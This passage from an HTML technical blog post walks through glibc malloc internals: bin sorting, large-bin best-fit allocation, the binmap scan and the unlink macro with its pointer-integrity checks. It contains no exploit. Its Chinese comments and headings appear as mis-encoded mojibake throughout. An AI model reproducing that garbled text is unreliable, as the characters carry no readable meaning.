class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(size))<span class="comment">//å¦‚æœè¿™ä¸ªåˆšæ‘˜ä¸‹æ¥çš„unsortedbinå †å—å±äºsmallbinèŒƒå›´,è®¡ç®—å¥½æ–°çš„å‰åé‚»å±…</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = smallbin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span><span class="comment">//å¦åˆ™è¯´æ˜è¿™unsortedbinå †å—å±äºlargebinèŒƒå›´,è®¡ç®—å¥½æ–°çš„å‰åé‚»å±…</span></span><br><span class="line">      &#123;</span><br><span class="line">        victim_index = largebin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)(bck-&gt;bk-&gt;size))</span><br><span class="line">          &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size &lt; fwd-&gt;size)</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)size == (<span class="type">unsigned</span> <span class="type">long</span>)fwd-&gt;size)</span><br><span class="line">              <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//ç»“ç®—,å‰é¢ä¸ç®¡æ˜¯largebinè¿˜æ˜¯smallbin,éƒ½å·²ç»è®¡ç®—å¥½äº†å‰åé‚»å±…bck,fwd,åœ¨æ­¤å°†è¯¸ä½è¿æ¥</span></span><br><span class="line">      mark_bin(av, victim_index);<span class="comment">//æ ‡è®°binmap</span></span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS 10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)<span class="comment">//é¡¶å¤šåˆå¹¶10000æ¬¡,å¤ªå¤šæ¬¡åˆå¹¶ä¼šå¯¼è‡´æœ¬æ¬¡è¯·æ±‚å“åº”å¤ªæ…¢</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="largebinç”³è¯·"><a href="#largebinç”³è¯·" class="headerlink" title="largebinç”³è¯·"></a>largebinç”³è¯·</h5><p>å¦‚æœåˆ°æ­¤è¿˜æ²¡æœ‰è¿”å›,ä¹Ÿå°±æ˜¯è¿˜æ²¡æœ‰ç”³è¯·åˆ°å †å—ä¸‹é¢å†å°è¯•ä½¿ç”¨largebinç”³è¯·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (!in_smallbin_range(nb))<span class="comment">//å¦‚æœæ˜¯ä¸€ä¸ªlargebinçš„è¯·æ±‚</span></span><br><span class="line"> &#123;</span><br><span class="line">   bin = bin_at(av, idx);<span class="comment">//å–æ¡¶å­å¤´</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">   <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">       (<span class="type">unsigned</span> <span class="type">long</span>)(victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb))</span><br><span class="line">   &#123;<span class="comment">//first(bin)=bin-&gt;fd,å¯ä»¥çœ‹å‡ºbin-&gt;fdåº”è¯¥æ˜¯è¯¥æ¡¶å­ä¸­æœ€å¤§çš„ä¸€ä¸ªå †å—,ç„¶åé¡ºç€fdæŒ‡é’ˆè¶Šæ¥è¶Šå°</span></span><br><span class="line">       <span class="comment">//å¦‚æœæœ€å¤§çš„å †å—éƒ½ä¸æ»¡è¶³nbçš„éœ€æ±‚,æ˜¾ç„¶å†å¾€åæ‰¾æ›´å°çš„æ— æ„ä¹‰,å› æ­¤é¦–å…ˆéœ€è¦åˆ¤æ–­æœ€å¤§çš„å †å—æ˜¯å¦èƒ½æ»¡è¶³è¦æ±‚,</span></span><br><span class="line"><span class="comment">//å½“è¿™ä¸ªå‰ææ¡ä»¶æ»¡è¶³æ—¶,å†å‘åæ‰¾æœ€ä½³é€‚é…çš„å †å—</span></span><br><span class="line">     victim = victim-&gt;bk_nextsize;<span class="comment">//bk_nextsizeæ˜¯ä¸‹ä¸€ä¸ªæ¯”å½“å‰victimå°çš„å †å—,victim-&gt;bkå¯èƒ½å’Œvictimä¸€æ ·å¤§,ä½†æ˜¯victim-&gt;bk_nextsizeè¦ä¹ˆæ˜¯æ¡¶å­å¤´,è¦ä¹ˆä¸€å®šæ¯”å½“å‰å †å—å°</span></span><br><span class="line">     <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">             (<span class="type">unsigned</span> <span class="type">long</span>)(nb)))</span><br><span class="line">       victim = victim-&gt;bk_nextsize;<span class="comment">//ä»å°å¼€å§‹éå†ç›´åˆ°ç¬¬ä¸€ä¸ªå¤§äºç­‰äºnbå¤§å°çš„å †å—</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">        list does not have to be rerouted.  */</span></span><br><span class="line">     <span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">       victim = victim-&gt;fd;<span class="comment">//é¿å…ç§»é™¤è·³è¡¨çš„æœ€å¼€å§‹ä¸€ä¸ªå¯¼è‡´å˜æ›´æŒ‡é’ˆ,é¦–å…ˆå°è¯•å¯»æ‰¾è¯¥å¤§å°çš„å †å—æ˜¯å¦æœ‰ç¬¬äºŒå—,å¦‚æœæœ‰åˆ™æ”¾è¿‡è·³è¡¨å¤´</span></span><br><span class="line">		</span><br><span class="line">     remainder_size = size - nb;<span class="comment">//victimå—æ¯”è¾ƒæŠ ,åªåˆ†é…nbå¤§å°å·¦å³,å¤šä½™çš„ä¸ç»™</span></span><br><span class="line">     unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Exhaust */</span></span><br><span class="line">     <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//å¦‚æœå‘ç°victimåˆ†å‰²åçš„å‰©ä½™éƒ¨åˆ†éƒ½æ˜¯ä¸‹è„šæ–™å°±ä¸æŠ äº†</span></span><br><span class="line">     &#123;</span><br><span class="line">       set_inuse_bit_at_offset(victim, size);</span><br><span class="line">       <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">         victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">/* Split */</span></span><br><span class="line">     <span class="keyword">else</span><span class="comment">//å¦åˆ™victimå‰©ä½™éƒ¨åˆ†æ”¾åˆ°unsortedbin</span></span><br><span class="line">     &#123;</span><br><span class="line">       remainder = chunk_at_offset(victim, nb);<span class="comment">//å–victimåˆ‡å‰²nbå­—èŠ‚ä¹‹åçš„å‰©ä½™éƒ¨åˆ†</span></span><br><span class="line">       <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">          have to perform a complete insert here.  */</span></span><br><span class="line">       bck = unsorted_chunks(av);</span><br><span class="line">       fwd = bck-&gt;fd;</span><br><span class="line">       <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">       &#123;</span><br><span class="line">         errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">         <span class="keyword">goto</span> errout;</span><br><span class="line">       &#125;</span><br><span class="line">       remainder-&gt;bk = bck;<span class="comment">//å¤´æ’æ³•</span></span><br><span class="line">       remainder-&gt;fd = fwd;</span><br><span class="line">       bck-&gt;fd = remainder;</span><br><span class="line">       fwd-&gt;bk = remainder;</span><br><span class="line">       <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">       &#123;</span><br><span class="line">         remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;<span class="comment">//å¦‚æœå‰©ä½™å¤§å°è¿˜æ˜¯largebinå¤§å°,åˆ™æ­¤æ—¶é¢„å…ˆå°†æŒ‡é’ˆæ¸…é›¶</span></span><br><span class="line">         remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">       set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">       set_foot(remainder, remainder_size);</span><br><span class="line">     &#125;</span><br><span class="line">     check_malloced_chunk(av, victim, nb);</span><br><span class="line">     <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">     alloc_perturb(p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>





<h5 id="åç»­largebinç”³è¯·"><a href="#åç»­largebinç”³è¯·" class="headerlink" title="åç»­largebinç”³è¯·"></a>åç»­largebinç”³è¯·</h5><p>å¦‚æœåˆ°æ­¤è¿˜æ²¡æœ‰åˆ†é…,è¯´æ˜å½“å‰largebiné‡Œé¢æ²¡æœ‰æ‰¾åˆ°ä½•æ—¶çš„,é‚£ä¹ˆå‘åé¢çš„largebinæ¡¶å­ä¸­æ‰¾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Search for a chunk by scanning bins, starting with next largest</span></span><br><span class="line"><span class="comment">   bin. This search is strictly by best-fit; i.e., the smallest</span></span><br><span class="line"><span class="comment">   (with ties going to approximately the least recently used) chunk</span></span><br><span class="line"><span class="comment">   that fits is selected.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The bitmap avoids needing to check that most blocks are nonempty.</span></span><br><span class="line"><span class="comment">   The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">   when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">++idx;					<span class="comment">//å–ä¸‹ä¸€ä¸ªæ¡¶å­çš„ä¸‹æ ‡</span></span><br><span class="line">bin = bin_at(av, idx);	<span class="comment">//é¦–å…ˆæŸ¥binmap,çœ‹çœ‹ä¸‹ä¸€ä¸ªæ¡¶å­æ˜¯å¦ç¡®å®æœ‰ç©ºé—²å †å—</span></span><br><span class="line">block = idx2block(idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">  <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)<span class="comment">//å¦‚æœbit&gt;mapåªå¯èƒ½æ˜¯map=0,ä¹Ÿå°±æ˜¯å½“å‰blockæ˜¯ç©ºçš„</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">        <span class="keyword">goto</span> use_top;<span class="comment">//å¦‚æœå‘ç°blockéå†äº†4ä¸ªblock,å…¨æ˜¯ç©ºçš„,ä¹Ÿå°±æ˜¯largebinç©ºäº†,ç›´æ¥ä½¿ç”¨top_chunkåˆ†é…</span></span><br><span class="line">    &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);<span class="comment">//è·³è¿‡æ‰€æœ‰ç©ºçš„largebin</span></span><br><span class="line"></span><br><span class="line">    bin = bin_at(av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">    bit = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">  <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)<span class="comment">//å°è¯•æ‰¾ä¸€ä¸ªmapå¯¹åº”blockä¸­æœ‰å †å—çš„æ¡¶å­</span></span><br><span class="line">  &#123;</span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;<span class="comment">//å·¦ç§»ä¹Ÿå°±æ˜¯å¾€largebinæ›´å¤§çš„æ–¹å‘æ‰¾</span></span><br><span class="line">    assert(bit != <span class="number">0</span>);</span><br><span class="line">  &#125;<span class="comment">//é€€å‡ºå¾ªç¯æ—¶,binå¯¹åº”çš„æ¡¶å­ä¸­ä¸€å®šæœ‰å †å—</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">  victim = last(bin);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">  <span class="keyword">if</span> (victim == bin)<span class="comment">//æ£€æŸ¥æ˜¯å¦è¯¥binä¸­è‡³å°‘æœ‰ä¸€ä¸ªå †å—,è¿™æ˜¯å› ä¸ºmapæ˜¯æ‡’ä¿®æ”¹çš„</span></span><br><span class="line">  &#123;<span class="comment">//ä¹Ÿå°±æ˜¯è¯´,mapä¸­æ ‡è®°æœ‰çš„ä¸ä¸€å®šæœ‰,ä½†æ˜¯mapä¸­æ ‡è®°æ²¡æœ‰çš„ä¸€å®šæ²¡æœ‰</span></span><br><span class="line">    av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">      <span class="comment">//æœ¬æ¡¶å­ä¸­ç¡®å®æ²¡æœ‰,ä½†ä¹Ÿä¸æ˜¯æ²¡æœ‰åŠŸåŠ³,èµ·ç å¯ä»¥ä¿®æ”¹map,ä¸‹ä¸€æ¬¡æŸ¥æ‰¾ä¸€å®šä¸ä¼šæŸ¥æœ¬æ¡¶å­</span></span><br><span class="line">    bin = next_bin(bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;<span class="comment">//ç»§ç»­å‘æ›´å¤§çš„largebinæ¡¶å­å¯»æ‰¾</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span><span class="comment">//æœ¬æ¡¶å­ä¸­ç¡®å®æœ‰è‡³å°‘ä¸€ä¸ªå †å—</span></span><br><span class="line">  &#123;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink(av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)<span class="comment">//ä¸‹è„šæ–™ä¸€èµ·é€äºº</span></span><br><span class="line">    &#123;</span><br><span class="line">      set_inuse_bit_at_offset(victim, size);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span>		<span class="comment">//åˆ‡å‰²æŒ‡å®šå¤§å°çš„å †å—,å‰©ä¸‹çš„é€ç»™unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">         have to perform a complete insert here.  */</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      remainder-&gt;bk = bck;</span><br><span class="line">      remainder-&gt;fd = fwd;</span><br><span class="line">      bck-&gt;fd = remainder; </span><br><span class="line">      fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      set_foot(remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h6 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h6><p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/unlink.png" alt="unlink"></p>
<p>ä»åŒå‘é“¾è¡¨ä¸Šæ‘˜ä¸‹ä¸€ä¸ªå †å—<code>P</code>,æŠŠå®ƒçš„å‰åé©±é‡æ–°é“¾æ¥èµ·æ¥</p>
<p>é’ˆå¯¹<code>smallbin</code>å’Œ<code>unsortedbin</code>,æœ‰å¦‚ä¸‹æ£€æŸ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;bk-&gt;fd==P</span><br><span class="line">P-&gt;fd-&gt;bk==P</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯ä¸€ä¸ª<code>largebin</code>çš„å †å—,è¿˜ä¼šæœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize==P</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize==P</span><br></pre></td></tr></table></figure>

<p>å¯¹äº<code>smallbin</code>å’Œ<code>unsortedbin</code>,å¦‚æœæ£€æŸ¥é€šè¿‡,åˆ™æ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;                                                                                                          \</span><br><span class="line">BK-&gt;fd = FD;     </span><br></pre></td></tr></table></figure>

<p>å°†Pçš„å‰åé©±è¿æ¥èµ·æ¥</p>
<p>å¯¹äº<code>largebin</code>çš„å †å—,è¿˜ä¼šæ‰§è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)                                                                                        \</span><br><span class="line">&#123;                                                                                                                   \</span><br><span class="line">  <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                                                                          \</span><br><span class="line">    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                                                                         \</span><br><span class="line">  <span class="keyword">else</span>                                                                                                              \</span><br><span class="line">  &#123;                                                                                                                 \</span><br><span class="line">    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                               \</span><br><span class="line">    FD-&gt;bk_nextsize </span><br><span class="line">    = P-&gt;bk_nextsize;                                                                               \</span><br><span class="line">    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                                                               \</span><br><span class="line">    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                                                               \</span><br><span class="line">  &#125;                                                                                                                 \</span><br><span class="line">&#125;                                                                                                                   \</span><br><span class="line"><span class="keyword">else</span>                                                                                                                \</span><br><span class="line">&#123;                                                                                                                   \</span><br><span class="line">  P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                     \</span><br><span class="line">  P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                     \</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p>å®Œæ•´ä»£ç å¦‚ä¸‹:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)                                                                                               \</span></span><br><span class="line"><span class="meta">  &#123;                                                                                                                         \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;                                                                                                             \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;                                                                                                             \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))                                                                    \</span></span><br><span class="line"><span class="meta">      <span class="comment">//æ£€æŸ¥åç»§çš„å‰é©±æŒ‡é’ˆä»¥åŠå‰é©±çš„åç»§æŒ‡é’ˆ</span></span></span><br><span class="line">      malloc_printerr(check_action, <span 